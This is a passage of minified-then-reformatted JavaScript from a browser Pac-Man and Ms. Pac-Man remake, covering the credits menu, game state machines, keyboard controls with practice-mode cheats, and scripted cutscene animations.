                  name: "bell",
                  points: 3e3,
                },
                {
                  name: "key",
                  points: 5e3,
                },
              ];
            for (y += 24, i = 0; i < pac_fruits.length; i++)
              (f = pac_fruits[i]),
                atlas.drawFruitSprite(ctx, x, y, f.name),
                atlas.drawPacFruitPoints(ctx, x + 16, y, f.points),
                (y += 16);
            for (x += 48, y = 108, i = 0; i < mspac_fruits.length; i++)
              (f = mspac_fruits[i]),
                atlas.drawFruitSprite(ctx, x, y, f.name),
                atlas.drawMsPacFruitPoints(ctx, x + 16, y, f.points),
                (y += 16);
            ctx.globalAlpha = 1;
          };
      })(),
      (function () {
        var menu = new Menu("", 16, 202, 194, 24, 8, "8px ArcadeR", "#EEE");
        menu.addTextButton("GO TO PROJECT PAGE", function () {
          window.open("https://github.com/shaunew/Pac-Man");
        }),
          menu.addTextButton("BACK", function () {
            switchState(homeState), menu.disable();
          }),
          (menu.backButton = menu.buttons[menu.buttonCount - 1]);
        var drawBody = function (ctx) {
          var x, y;
          (ctx.font = "8px ArcadeR"),
            (ctx.textBaseline = "top"),
            (ctx.textAlign = "left"),
            (x = 16),
            (y = 0),
            (ctx.fillStyle = "#0FF"),
            ctx.fillText("DEVELOPER", x, y),
            (y += 16),
            (ctx.fillStyle = "#777"),
            ctx.fillText("SHAUN WILLIAMS", x, y),
            (y += 32),
            (ctx.fillStyle = "#0FF"),
            ctx.fillText("REVERSE-ENGINEERS", x, y),
            (y += 16),
            (ctx.fillStyle = "#777"),
            ctx.fillText("YIELD", x, y),
            (y += 16),
            ctx.fillText("3000", x, y),
            (y += 32),
            (ctx.fillStyle = "#FF0"),
            ctx.fillText("PAC-MAN", x, y),
            (y += 16),
            (ctx.fillStyle = "#777"),
            ctx.fillText("NAMCO", x, y),
            (y += 32),
            (ctx.fillStyle = "#FF0"),
            ctx.fillText("MS. PAC-MAN / CRAZY OTTO", x, y),
            (y += 16),
            (ctx.fillStyle = "#777"),
            ctx.fillText("GENERAL COMPUTING", x, y);
        };
      })(),
      (startLevel = 1),
      {
        init: function () {
          clearCheats(),
            (frames = 0),
            (level = startLevel - 1),
            (extraLives = practiceMode ? 1 / 0 : 3),
            setScore(0),
            setFruitFromGameMode(),
            readyNewState.init();
        },
        setStartLevel: function (i) {
          startLevel = i;
        },
        draw: function () {
          map &&
            (renderer.blitMap(),
            renderer.drawScore(),
            renderer.drawMessage("PLAYER ONE", "#0FF", 9, 14),
            renderer.drawReadyMessage());
        },
        update: function () {
          0 == frames
            ? (extraLives--, (state = readyNewState), renderer.drawMap())
            : frames++;
        },
      }),
    readyState = (function () {
      var frames;
      return {
        init: function () {
          var i;
          for (audio.startMusic.play(), i = 0; i < 5; i++) actors[i].reset();
          ghostCommander.reset(),
            fruit.reset(),
            energizer.reset(),
            map.resetTimeEaten(),
            (frames = 0),
            vcr.init();
        },
        draw: function () {
          map &&
            (renderer.blitMap(),
            renderer.drawScore(),
            renderer.drawActors(),
            renderer.drawReadyMessage());
        },
        update: function () {
          240 == frames ? switchState(playState) : frames++;
        },
      };
    })(),
    readyNewState = newChildObject(readyState, {
      init: function () {
        level++,
          0 == gameMode
            ? (map = mapPacman)
            : 1 == gameMode || 3 == gameMode
            ? setNextMsPacMap()
            : 2 == gameMode && setNextCookieMap(),
          map.resetCurrent(),
          fruit.onNewLevel(),
          renderer.drawMap(),
          ghostReleaser.onNewLevel(),
          elroyTimer.onNewLevel(),
          readyState.init.call(this);
      },
    }),
    readyRestartState = newChildObject(readyState, {
      init: function () {
        extraLives--,
          ghostReleaser.onRestartLevel(),
          elroyTimer.onRestartLevel(),
          renderer.drawMap(),
          readyState.init.call(this);
      },
    }),
    playState = {
      init: function () {
        practiceMode && vcr.reset();
      },
      draw: function () {
        renderer.setLevelFlash(!1),
          renderer.blitMap(),
          renderer.drawScore(),
          renderer.beginMapClip(),
          renderer.drawFruit(),
          renderer.drawPaths(),
          renderer.drawActors(),
          renderer.drawTargets(),
          renderer.endMapClip();
      },
      isPacmanCollide: function () {
        var i, g;
        for (i = 0; i < 4; i++)
          if (
            (g = ghosts[i]).tile.x == pacman.tile.x &&
            g.tile.y == pacman.tile.y &&
            0 == g.mode
          ) {
            if (g.scared) energizer.addPoints(), g.onEaten();
            else {
              if (pacman.invincible) continue;
              switchState(deadState);
            }
            return !0;
          }
        return !1;
      },
      update: function () {
        if (vcr.isSeeking()) vcr.seek();
        else {
          var i, j;
          vcr.getMode() == VCR_RECORD && vcr.record();
          var skip = !1;
          if (energizer.showingPoints()) {
            for (j = 0; j < 2; j++)
              for (i = 0; i < 4; i++)
                (ghosts[i].mode != GHOST_GOING_HOME &&
                  ghosts[i].mode != GHOST_ENTERING_HOME) ||
                  ghosts[i].update(j);
            energizer.updatePointsTimer(), (skip = !0);
          } else {
            for (i = 0; i < 4; i++)
              ghosts[i].mode == GHOST_EATEN &&
                ((ghosts[i].mode = GHOST_GOING_HOME),
                (ghosts[i].targetting = "door"));
            ghosts[0].playSounds();
          }
          if (!skip) {
            for (
              ghostReleaser.update(),
                ghostCommander.update(),
                elroyTimer.update(),
                fruit.update(),
                energizer.update(),
                j = 0;
              j < 2;
              j++
            ) {
              if ((pacman.update(j), fruit.testCollide(), map.allDotsEaten())) {
                switchState(finishState), audio.extend.play();
                break;
              }
              if (this.isPacmanCollide()) break;
              for (i = 0; i < 4; i++) actors[i].update(j);
              if (this.isPacmanCollide()) break;
            }
            for (i = 0; i < 5; i++) actors[i].frames++;
          }
        }
      },
    },
    scriptState = {
      init: function () {
        (this.frames = 0), (this.triggerFrame = 0);
        var trigger = this.triggers[0];
        (this.drawFunc = trigger ? trigger.draw : void 0),
          (this.updateFunc = trigger ? trigger.update : void 0);
      },
      update: function () {
        var trigger = this.triggers[this.frames];
        trigger &&
          (trigger.init && trigger.init(),
          (this.drawFunc = trigger.draw),
          (this.updateFunc = trigger.update),
          (this.triggerFrame = 0)),
          this.updateFunc && this.updateFunc(this.triggerFrame),
          this.frames++,
          this.triggerFrame++;
      },
      draw: function () {
        this.drawFunc && this.drawFunc(this.triggerFrame);
      },
    },
    seekableScriptState = newChildObject(scriptState, {
      init: function () {
        scriptState.init.call(this),
          (this.savedFrames = {}),
          (this.savedTriggerFrame = {}),
          (this.savedDrawFunc = {}),
          (this.savedUpdateFunc = {});
      },
      save: function (t) {
        (this.savedFrames[t] = this.frames),
          (this.savedTriggerFrame[t] = this.triggerFrame),
          (this.savedDrawFunc[t] = this.drawFunc),
          (this.savedUpdateFunc[t] = this.updateFunc);
      },
      load: function (t) {
        (this.frames = this.savedFrames[t]),
          (this.triggerFrame = this.savedTriggerFrame[t]),
          (this.drawFunc = this.savedDrawFunc[t]),
          (this.updateFunc = this.savedUpdateFunc[t]);
      },
      update: function () {
        vcr.isSeeking()
          ? vcr.seek()
          : (vcr.getMode() == VCR_RECORD && vcr.record(),
            scriptState.update.call(this));
      },
      draw: function () {
        this.drawFunc && scriptState.draw.call(this);
      },
    }),
    deadState =
      ((commonDraw = function () {
        renderer.blitMap(), renderer.drawScore();
      }),
      newChildObject(seekableScriptState, {
        triggers: {
          0: {
            init: function () {
              audio.die.play();
            },
            update: function () {
              var i;
              for (i = 0; i < 4; i++) actors[i].frames++;
            },
            draw: function () {
              commonDraw(),
                renderer.beginMapClip(),
                renderer.drawFruit(),
                renderer.drawActors(),
                renderer.endMapClip();
            },
          },
          60: {
            draw: function () {
              commonDraw(),
                renderer.beginMapClip(),
                renderer.drawPlayer(),
                renderer.endMapClip();
            },
          },
          120: {
            draw: function (t) {
              commonDraw(),
                renderer.beginMapClip(),
                renderer.drawDyingPlayer(t / 75),
                renderer.endMapClip();
            },
          },
          195: {
            draw: function () {
              commonDraw(),
                renderer.beginMapClip(),
                renderer.drawDyingPlayer(1),
                renderer.endMapClip();
            },
          },
          240: {
            draw: function () {
              commonDraw(),
                renderer.beginMapClip(),
                renderer.drawDyingPlayer(1),
                renderer.endMapClip();
            },
            init: function () {
              switchState(0 == extraLives ? overState : readyRestartState);
            },
          },
        },
      })),
    finishState =
      ((flashFloorAndDraw = function (on) {
        renderer.setLevelFlash(on),
          renderer.blitMap(),
          renderer.drawScore(),
          renderer.beginMapClip(),
          renderer.drawPlayer(),
          renderer.endMapClip();
      }),
      newChildObject(seekableScriptState, {
        triggers: {
          0: {
            draw: function () {
              renderer.setLevelFlash(!1),
                renderer.blitMap(),
                renderer.drawScore(),
                renderer.beginMapClip(),
                renderer.drawFruit(),
                renderer.drawActors(),
                renderer.drawTargets(),
                renderer.endMapClip();
            },
          },
          120: {
            draw: function () {
              flashFloorAndDraw(!0);
            },
          },
          132: {
            draw: function () {
              flashFloorAndDraw(!1);
            },
          },
          144: {
            draw: function () {
              flashFloorAndDraw(!0);
            },
          },
          156: {
            draw: function () {
              flashFloorAndDraw(!1);
            },
          },
          168: {
            draw: function () {
              flashFloorAndDraw(!0);
            },
          },
          180: {
            draw: function () {
              flashFloorAndDraw(!1);
            },
          },
          192: {
            draw: function () {
              flashFloorAndDraw(!0);
            },
          },
          204: {
            draw: function () {
              flashFloorAndDraw(!1);
            },
          },
          216: {
            init: function () {
              triggerCutsceneAtEndLevel() || switchState(readyNewState, 60);
            },
          },
        },
      })),
    overState = (function () {
      var frames;
      return {
        init: function () {
          frames = 0;
        },
        draw: function () {
          renderer.blitMap(),
            renderer.drawScore(),
            renderer.drawMessage("GAME  OVER", "#F00", 9, 20);
        },
        update: function () {
          120 == frames ? switchState(homeState, 60) : frames++;
        },
      };
    })();
  !(function () {
    var KeyEventListener = function () {
      this.listeners = {};
    };
    KeyEventListener.prototype = {
      add: function (key, callback, isActive) {
        (this.listeners[key] = this.listeners[key] || []),
          this.listeners[key].push({
            isActive: isActive,
            callback: callback,
          });
      },
      exec: function (key, e) {
        var keyListeners = this.listeners[key];
        if (keyListeners) {
          var i,
            l,
            numListeners = keyListeners.length;
          for (
            i = 0;
            i < numListeners &&
            (((l = keyListeners[i]).isActive && !l.isActive()) ||
              (e.preventDefault(), !l.callback()));
            i++
          );
        }
      },
    };
    var keyDownListeners = new KeyEventListener(),
      keyUpListeners = new KeyEventListener(),
      addKeyDown = function (key, callback, isActive) {
        keyDownListeners.add(key, callback, isActive);
      },
      addKeyUp = function (key, callback, isActive) {
        keyUpListeners.add(key, callback, isActive);
      },
      keyStates = {};
    window.addEventListener("keydown", function (e) {
      var key = (e || window.event).keyCode;
      keyStates[key] || ((keyStates[key] = !0), keyDownListeners.exec(key, e));
    }),
      window.addEventListener("keyup", function (e) {
        var key = (e || window.event).keyCode;
        (keyStates[key] = !1), keyUpListeners.exec(key, e);
      });
    var menu,
      isInMenu = function () {
        return (
          !(menu = state.getMenu && state.getMenu()) &&
            inGameMenu.isOpen() &&
            (menu = inGameMenu.getMenu()),
          menu
        );
      };
    addKeyDown(
      27,
      function () {
        return menu.backButton && menu.backButton.onclick(), !0;
      },
      isInMenu
    ),
      addKeyDown(
        13,
        function () {
          menu.clickCurrentOption();
        },
        isInMenu
      );
    var isMenuKeysAllowed = function () {
      var menu = isInMenu();
      return menu && !menu.noArrowKeys;
    };
    addKeyDown(
      38,
      function () {
        menu.selectPrevOption();
      },
      isMenuKeysAllowed
    ),
      addKeyDown(
        40,
        function () {
          menu.selectNextOption();
        },
        isMenuKeysAllowed
      );
    addKeyDown(
      27,
      function () {
        return inGameMenu.getMenuButton().onclick(), !0;
      },
      function () {
        return hud.isValidState() && !inGameMenu.isOpen();
      }
    );
    var isPlayState = function () {
      return (
        state == learnState ||
        state == newGameState ||
        state == playState ||
        state == readyNewState ||
        state == readyRestartState
      );
    };
    addKeyDown(
      37,
      function () {
        pacman.setInputDir(1);
      },
      isPlayState
    ),
      addKeyDown(
        39,
        function () {
          pacman.setInputDir(3);
        },
        isPlayState
      ),
      addKeyDown(
        38,
        function () {
          pacman.setInputDir(0);
        },
        isPlayState
      ),
      addKeyDown(
        40,
        function () {
          pacman.setInputDir(2);
        },
        isPlayState
      ),
      addKeyUp(
        37,
        function () {
          pacman.clearInputDir(1);
        },
        isPlayState
      ),
      addKeyUp(
        39,
        function () {
          pacman.clearInputDir(3);
        },
        isPlayState
      ),
      addKeyUp(
        38,
        function () {
          pacman.clearInputDir(0);
        },
        isPlayState
      ),
      addKeyUp(
        40,
        function () {
          pacman.clearInputDir(2);
        },
        isPlayState
      );
    var isPracticeMode = function () {
      return isPlayState() && practiceMode;
    };
    addKeyDown(
      49,
      function () {
        executive.setUpdatesPerSecond(30);
      },
      isPracticeMode
    ),
      addKeyDown(
        50,
        function () {
          executive.setUpdatesPerSecond(15);
        },
        isPracticeMode
      ),
      addKeyUp(
        49,
        function () {
          executive.setUpdatesPerSecond(60);
        },
        isPracticeMode
      ),
      addKeyUp(
        50,
        function () {
          executive.setUpdatesPerSecond(60);
        },
        isPracticeMode
      );
    var canSeek = function () {
      return !isInMenu() && vcr.getMode() != VCR_NONE;
    };
    addKeyDown(
      16,
      function () {
        vcr.startSeeking();
      },
      canSeek
    ),
      addKeyUp(
        16,
        function () {
          vcr.startRecording();
        },
        canSeek
      );
    var isSeekState = function () {
      return vcr.isSeeking();
    };
    addKeyDown(
      38,
      function () {
        vcr.nextSpeed(1);
      },
      isSeekState
    ),
      addKeyDown(
        40,
        function () {
          vcr.nextSpeed(-1);
        },
        isSeekState
      );
    addKeyDown(
      78,
      function () {
        switchState(readyNewState, 60);
      },
      function () {
        return (
          isPracticeMode() &&
          (state == newGameState ||
            state == readyNewState ||
            state == readyRestartState ||
            state == playState ||
            state == deadState ||
            state == finishState ||
            state == overState)
        );
      }
    ),
      addKeyDown(
        77,
        function () {
          switchState(finishState);
        },
        function () {
          return state == playState;
        }
      ),
      addKeyDown(
        81,
        function () {
          blinky.isDrawTarget = !blinky.isDrawTarget;
        },
        isPracticeMode
      ),
      addKeyDown(
        87,
        function () {
          pinky.isDrawTarget = !pinky.isDrawTarget;
        },
        isPracticeMode
      ),
      addKeyDown(
        69,
        function () {
          inky.isDrawTarget = !inky.isDrawTarget;
        },
        isPracticeMode
      ),
      addKeyDown(
        82,
        function () {
          clyde.isDrawTarget = !clyde.isDrawTarget;
        },
        isPracticeMode
      ),
      addKeyDown(
        84,
        function () {
          pacman.isDrawTarget = !pacman.isDrawTarget;
        },
        isPracticeMode
      ),
      addKeyDown(
        65,
        function () {
          blinky.isDrawPath = !blinky.isDrawPath;
        },
        isPracticeMode
      ),
      addKeyDown(
        83,
        function () {
          pinky.isDrawPath = !pinky.isDrawPath;
        },
        isPracticeMode
      ),
      addKeyDown(
        68,
        function () {
          inky.isDrawPath = !inky.isDrawPath;
        },
        isPracticeMode
      ),
      addKeyDown(
        70,
        function () {
          clyde.isDrawPath = !clyde.isDrawPath;
        },
        isPracticeMode
      ),
      addKeyDown(
        71,
        function () {
          pacman.isDrawPath = !pacman.isDrawPath;
        },
        isPracticeMode
      ),
      addKeyDown(
        73,
        function () {
          pacman.invincible = !pacman.invincible;
        },
        isPracticeMode
      ),
      addKeyDown(
        79,
        function () {
          turboMode = !turboMode;
        },
        isPracticeMode
      ),
      addKeyDown(
        80,
        function () {
          pacman.ai = !pacman.ai;
        },
        isPracticeMode
      ),
      addKeyDown(35, function () {
        executive.togglePause();
      });
  })();
  var ghostMode,
    playerMode,
    inkyBounceX,
    inkyBounceY,
    pinkyBounceX,
    pinkyBounceY,
    inkyBounceFrame,
    pinkyBounceFrame,
    inkyBounceFrameLen,
    pinkyBounceFrameLen,
    rampX,
    rampY,
    rampFrame,
    rampFrameLen,
    climbFrame,
    meetFrame,
    pac,
    mspac,
    drawPlayer,
    map,
    playCutScene = function (cutScene, nextState) {
      (map = void 0),
        renderer.drawMap(!0),
        setTimeout(audio.coffeeBreakMusic.startLoop, 1200),
        (cutScene.nextState = nextState),
        switchState(cutScene, 60);
    },
    pacmanCutscene1 = newChildObject(scriptState, {
      init: function () {
        scriptState.init.call(this),
          pacman.setPos(232, 164),
          blinky.setPos(257, 164),
          blinky.setDir(1),
          (blinky.faceDirEnum = 1),
          pacman.setDir(1),
          (blinky.scared = !1),
          (blinky.mode = 0),
          backupCheats(),
          clearCheats(),
          energizer.reset(),
          (pacman.getNumSteps = function () {
            return Actor.prototype.getStepSizeFromTable.call(this, 5, 0);
          }),
          (blinky.getNumSteps = function () {
            return Actor.prototype.getStepSizeFromTable.call(this, 5, 6);
          }),
          (pacman.steer = blinky.steer = function () {});
      },
      triggers: {
        0: {
          update: function () {
            var j;
            for (j = 0; j < 2; j++) pacman.update(j), blinky.update(j);
            pacman.frames++, blinky.frames++;
          },
          draw: function () {
            renderer.blitMap(),
              renderer.beginMapClip(),
              renderer.drawPlayer(),
              renderer.drawGhost(blinky),
              renderer.endMapClip();
          },
        },
        260: {
          init: function () {
            pacman.setPos(-193, 155),
              blinky.setPos(-8, 164),
              blinky.setDir(3),
              (blinky.faceDirEnum = 3),
              pacman.setDir(3),
              (blinky.scared = !0),
              (pacman.getNumSteps = function () {
                return Actor.prototype.getStepSizeFromTable.call(this, 5, 2);
              }),
              (blinky.getNumSteps = function () {
                return Actor.prototype.getStepSizeFromTable.call(this, 5, 3);
              });
          },
          update: function () {
            var j;
            for (j = 0; j < 2; j++) pacman.update(j), blinky.update(j);
            pacman.frames++, blinky.frames++;
          },
          draw: function () {
            renderer.blitMap(),
              renderer.beginMapClip(),
              renderer.drawGhost(blinky),
              renderer.renderFunc(function (ctx) {
                var frame = Math.floor(pacman.steps / 4) % 4;
                3 == frame && (frame = 1),
                  (function (ctx, x, y, dirEnum, frame) {
                    var mouthShift = 0,
                      angle = 0;
                    1 == frame
                      ? ((mouthShift = -4), (angle = Math.atan(0.5)))
                      : 2 == frame &&
                        ((mouthShift = -2), (angle = Math.atan(13 / 9))),
                      ctx.save(),
                      ctx.translate(x, y);
                    var d90 = Math.PI / 2;
                    0 == dirEnum
                      ? ctx.rotate(3 * d90)
                      : 3 == dirEnum
                      ? ctx.rotate(0)
                      : 2 == dirEnum
                      ? ctx.rotate(d90)
                      : 1 == dirEnum && ctx.rotate(2 * d90),
                      ctx.beginPath(),
                      ctx.moveTo(mouthShift, 0),
                      ctx.arc(0, 0, 16, angle, 2 * Math.PI - angle),
                      ctx.closePath(),
                      (ctx.fillStyle = "#FF0"),
                      ctx.fill(),
                      ctx.restore();
                  })(
                    ctx,
                    pacman.pixel.x,
                    pacman.pixel.y,
                    pacman.dirEnum,
                    frame
                  );
              }),
              renderer.endMapClip();
          },
        },
        640: {
          init: function () {
            delete pacman.getNumSteps,
              delete blinky.getNumSteps,
              delete pacman.steer,
              delete blinky.steer,
              restoreCheats(),
              switchState(pacmanCutscene1.nextState, 60);
          },
        },
      },
    }),
    mspacmanCutscene1 =
      ((pac = new Player()),
      (mspac = new Player()),
      (drawPlayer = function (ctx, player) {
        var func,
          frame = player.getAnimFrame();
        player == pac
          ? (func =
              1 == gameMode ? atlas.drawPacmanSprite : atlas.drawOttoSprite)
          : player == mspac &&
            (func =
              1 == gameMode
                ? atlas.drawMsPacmanSprite
                : atlas.drawMsOttoSprite),
          func(ctx, player.pixel.x, player.pixel.y, player.dirEnum, frame);
      }),
      newChildObject(scriptState, {
        init: function () {
          scriptState.init.call(this),
            (mspac.frames = 20),
            (pac.frames = 12),
            pac.setPos(-10, 99),
            pac.setDir(3),
            mspac.setPos(232, 180),
            mspac.setDir(1),
            (inky.frames = 0),
            (inky.mode = 0),
            (inky.scared = !1),
            inky.setPos(pac.pixel.x - 42, 99),
            inky.setDir(3),
            (inky.faceDirEnum = 3),
            (pinky.frames = 3),
            (pinky.mode = 0),
            (pinky.scared = !1),
            pinky.setPos(mspac.pixel.x + 49, 180),
            pinky.setDir(1),
            (pinky.faceDirEnum = 1),
            backupCheats(),
            clearCheats(),
            energizer.reset(),
            (pac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (mspac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (inky.getAnimFrame = function () {
              return Math.floor(this.frames / 8) % 2;
            }),
            (pinky.getAnimFrame = function () {
              return Math.floor(this.frames / 8) % 2;
            }),
            (pac.getNumSteps = function () {
              return 1;
            }),
            (mspac.getNumSteps = function () {
              return 1;
            }),
            (inky.getNumSteps = function () {
              return 1;
            }),
            (pinky.getNumSteps = function () {
              return 1;
            }),
            (pac.steer = function () {}),
            (mspac.steer = function () {}),
            (inky.steer = function () {}),
            (pinky.steer = function () {});
        },
        triggers: {
          0: {
            update: function () {
              !(function () {
                var j;
                for (j = 0; j < 2; j++)
                  pac.update(j),
                    mspac.update(j),
                    inky.update(j),
                    pinky.update(j);
                pac.frames++, mspac.frames++, inky.frames++, pinky.frames++;
              })(),
                105 == inky.pixel.x &&
                  ((inky.getNumSteps = function () {
                    return Actor.prototype.getStepSizeFromTable.call(
                      this,
                      5,
                      6
                    );
                  }),
                  (pinky.getNumSteps = function () {
                    return Actor.prototype.getStepSizeFromTable.call(
                      this,
                      5,
                      6
                    );
                  }));
            },
            draw: function () {
              renderer.blitMap(),
                renderer.beginMapClip(),
                renderer.renderFunc(function (ctx) {
                  drawPlayer(ctx, pac), drawPlayer(ctx, mspac);
                }),
                renderer.drawGhost(inky),
                renderer.drawGhost(pinky),
                renderer.endMapClip();
            },
          },
          300:
            ((inkyBounceX = [
              1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1,
              0, 1, 0,
            ]),
            (inkyBounceY = [
              -1, 0, -1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, -1, 0, -1, 0, 0, 0, 0,
              0, 1, 0, 1,
            ]),
            (pinkyBounceX = [
              0, 0, 0, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0, -1, 0, 0, -1, 0, -1, 0,
              -1, 0, 0, -1, 0, -1, 0, -1, 0, 0,
            ]),
            (pinkyBounceY = [
              0, 0, 0, -1, 0, -1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, -1, 0, -1, 0,
              0, 0, 0, 0, 1, 0, 1, 0, 0,
            ]),
            (inkyBounceFrame = 0),
            (pinkyBounceFrame = 0),
            (inkyBounceFrameLen = inkyBounceX.length),
            (pinkyBounceFrameLen = pinkyBounceX.length),
            (rampX = [0, 1, 1, 1, 1, 0, 0]),
            (rampY = [0, 0, -1, -1, -1, 0, 0]),
            (rampFrame = 0),
            (rampFrameLen = rampX.length),
            (climbFrame = 0),
            (meetFrame = 0),
            {
              init: function () {
                (inkyBounceFrame =
                  pinkyBounceFrame =
                  rampFrame =
                  climbFrame =
                  meetFrame =
                    0),
                  (ghostMode = 0),
                  (playerMode = 0),
                  mspac.setPos(-8, 143),
                  mspac.setDir(3),
                  pinky.setPos(-81, 143),
                  (pinky.faceDirEnum = 3),
                  pinky.setDir(3),
                  pac.setPos(234, 142),
                  pac.setDir(1),
                  inky.setPos(302, 143),
                  (inky.faceDirEnum = 1),
                  inky.setDir(1),
                  (inky.getNumSteps = pinky.getNumSteps =
                    function () {
                      return "11211212"[this.frames % 8];
                    });
              },
              update: function () {
                var j;
                if (0 == playerMode) {
                  for (j = 0; j < 2; j++) pac.update(j), mspac.update(j);
                  102 == mspac.pixel.x && playerMode++;
                } else if (1 == playerMode)
                  (pac.pixel.x -= rampX[rampFrame]),
                    (pac.pixel.y += rampY[rampFrame]),
                    pac.commitPos(),
                    (mspac.pixel.x += rampX[rampFrame]),
                    (mspac.pixel.y += rampY[rampFrame]),
                    mspac.commitPos(),
                    ++rampFrame == rampFrameLen && playerMode++;
                else if (2 == playerMode) {
                  if (0 == climbFrame)
                    (mspac.pixel.y -= 2),
                      mspac.commitPos(),
                      mspac.setDir(0),
                      (pac.pixel.x -= 1),
                      pac.commitPos(),
                      pac.setDir(0);
                  else for (j = 0; j < 2; j++) pac.update(j), mspac.update(j);
                  climbFrame++, 91 == mspac.pixel.y && playerMode++;
                } else
                  3 == playerMode &&
                    (0 == meetFrame &&
                      (mspac.pixel.y++,
                      mspac.setDir(3),
                      mspac.commitPos(),
                      pac.pixel.y--,
                      pac.pixel.x++,
                      pac.setDir(1),
                      pac.commitPos()),
                    meetFrame > 18 && (pac.frames--, mspac.frames--),
                    78 == meetFrame &&
                      (delete inky.getNumSteps,
                      delete pinky.getNumSteps,
                      delete inky.steer,
                      delete pinky.steer,
                      delete inky.getAnimFrame,
                      delete pinky.getAnimFrame,
                      restoreCheats(),
                      switchState(mspacmanCutscene1.nextState, 60)),
                    meetFrame++);
                if ((pac.frames++, mspac.frames++, 0 == ghostMode)) {
                  for (j = 0; j < 2; j++) inky.update(j), pinky.update(j);
                  (inky.pixel.x = Math.max(120, inky.pixel.x)),
                    inky.commitPos(),
                    (pinky.pixel.x = Math.min(105, pinky.pixel.x)),
                    pinky.commitPos(),
                    105 == pinky.pixel.x && ghostMode++;
                } else
                  1 == ghostMode &&
                    (inkyBounceFrame < inkyBounceFrameLen &&
                      ((inky.pixel.x += inkyBounceX[inkyBounceFrame]),
                      (inky.pixel.y += inkyBounceY[inkyBounceFrame])),
                    pinkyBounceFrame < pinkyBounceFrameLen &&
                      ((pinky.pixel.x += pinkyBounceX[pinkyBounceFrame]),
                      (pinky.pixel.y += pinkyBounceY[pinkyBounceFrame])),
                    inkyBounceFrame++,
                    pinkyBounceFrame++);
                inky.frames++, pinky.frames++;
              },
              draw: function () {
                renderer.blitMap(),
                  renderer.beginMapClip(),
                  renderer.renderFunc(function (ctx) {
                    drawPlayer(ctx, pac), drawPlayer(ctx, mspac);
                  }),
                  inkyBounceFrame < inkyBounceFrameLen &&
                    renderer.drawGhost(inky),
                  pinkyBounceFrame < pinkyBounceFrameLen &&
                    renderer.drawGhost(pinky),
                  3 == playerMode &&
                    renderer.renderFunc(function (ctx) {
                      drawHeartSprite(ctx, 112, 73);
                    }),
                  renderer.endMapClip();
              },
            }),
        },
      })),
    mspacmanCutscene2 = (function () {
      var pac = new Player(),
        mspac = new Player(),
        drawPlayer = function (ctx, player) {
          var func,
            frame = player.getAnimFrame();
          player == pac
            ? (func =
                1 == gameMode ? atlas.drawPacmanSprite : atlas.drawOttoSprite)
            : player == mspac &&
              (func =
                1 == gameMode
                  ? atlas.drawMsPacmanSprite
                  : atlas.drawMsOttoSprite),
            func(ctx, player.pixel.x, player.pixel.y, player.dirEnum, frame);
        },
        draw = function () {
          renderer.blitMap(),
            renderer.beginMapClip(),
            renderer.renderFunc(function (ctx) {
              drawPlayer(ctx, pac), drawPlayer(ctx, mspac);
            }),
            renderer.endMapClip();
        },
        update = function () {
          var j;
          for (j = 0; j < 7; j++) pac.update(j), mspac.update(j);
          pac.frames++, mspac.frames++;
        },
        getChaseSteps = function () {
          return 3;
        },
        getFleeSteps = function () {
          return "32"[this.frames % 2];
        },
        getDartSteps = function () {
          return 7;
        };
      return newChildObject(scriptState, {
        init: function () {
          scriptState.init.call(this),
            (mspac.frames = 20),
            (pac.frames = 12),
            (pac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (mspac.getStepFrame = function () {
              return Math.floor(this.frames / 4) % 4;
            }),
            (pac.steer = function () {}),
            (mspac.steer = function () {}),
            backupCheats(),
            clearCheats();
        },
        triggers: {
          0: {
            draw: function () {
              renderer.blitMap();
            },
          },
          160: {
            init: function () {
              pac.setPos(-8, 67),
                pac.setDir(3),
                mspac.setPos(-106, 68),
                mspac.setDir(3),
                (pac.getNumSteps = getFleeSteps),
                (mspac.getNumSteps = getChaseSteps);
            },
            update: update,
            draw: draw,
          },
          410: {
            init: function () {
              pac.setPos(329, 163),
                pac.setDir(1),
                mspac.setPos(231, 164),
                mspac.setDir(1),
                (pac.getNumSteps = getChaseSteps),
                (mspac.getNumSteps = getFleeSteps);
            },
            update: update,
            draw: draw,
          },
          670: {
            init: function () {
              pac.setPos(-8, 142),
                pac.setDir(3),
                mspac.setPos(-106, 143),
                mspac.setDir(3),
                (pac.getNumSteps = getFleeSteps),
                (mspac.getNumSteps = getChaseSteps);
            },
            update: update,
            draw: draw,
          },
          930: {
            init: function () {
              pac.setPos(381, 99),
                pac.setDir(1),
                mspac.setPos(233, 100),
                mspac.setDir(1),
                (pac.getNumSteps = getDartSteps),
                (mspac.getNumSteps = getDartSteps);
            },
            update: function () {
              pac.pixel.x <= 17 &&
                1 == pac.dirEnum &&
                (pac.setPos(-2, 195),
                pac.setDir(3),
                mspac.setPos(-150, 196),
                mspac.setDir(3)),
                update();
            },
            draw: draw,
          },
          1140: {
            init: function () {
              restoreCheats(), switchState(mspacmanCutscene2.nextState, 60);
            },
          },
        },
      });
    })(),
    cookieCutscene1 = newChildObject(scriptState, {
      init: function () {
        scriptState.init.call(this),
          pacman.setPos(232, 164),
          blinky.setPos(257, 164),
          blinky.setDir(1),
          (blinky.faceDirEnum = 1),
          pacman.setDir(1),
          (blinky.scared = !1),
          (blinky.mode = 0),
          backupCheats(),
          clearCheats(),
          energizer.reset(),
          (pacman.getNumSteps = function () {
            return Actor.prototype.getStepSizeFromTable.call(this, 5, 0);
          }),
          (blinky.getNumSteps = function () {
            return Actor.prototype.getStepSizeFromTable.call(this, 5, 6);
          }),
          (pacman.steer = blinky.steer = function () {});
      },
      triggers: {
        0: {
          update: function () {
            var j;
            for (j = 0; j < 2; j++) pacman.update(j), blinky.update(j);
            pacman.frames++, blinky.frames++;
          },
          draw: function () {
            renderer.blitMap(),
              renderer.beginMapClip(),
              renderer.drawPlayer(),
              renderer.drawGhost(blinky),
              renderer.endMapClip();
          },
        },
        260: {
          init: function () {
            pacman.setPos(-193, 164),
              blinky.setPos(-8, 155),
              blinky.setDir(3),
              (blinky.faceDirEnum = 3),
              pacman.setDir(3),
              (blinky.scared = !0),
              (pacman.getNumSteps = function () {
                return Actor.prototype.getStepSizeFromTable.call(this, 5, 2);
              }),
